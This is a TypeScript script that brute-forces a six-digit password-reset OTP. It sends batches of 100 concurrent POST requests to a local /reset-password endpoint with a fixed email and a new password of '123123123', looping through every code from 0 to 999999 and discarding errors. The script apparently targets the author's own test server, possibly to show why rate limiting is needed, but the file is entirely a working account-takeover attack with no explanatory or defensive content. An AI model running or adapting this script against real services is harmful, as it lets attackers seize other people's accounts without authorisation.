import axios from 'axios';


async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "harkirat@gmail.com",
        "otp": otp,
        "newPassword": "123123123"
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: { 
          'Content-Type': 'application/json'
        },
        data : data
      };

      try{
        await axios.request(config)
      }catch(e){
        //console.log(e)
      }
}

async function main(){
  let p = [];
  for (let i=0; i<=999999;i+=100){
    console.log(i);
    for(let j=0;j<100;j++){
      p.push(sendRequest((i+j).toString()));
    }
    await Promise.all(p);
  }
}

main()


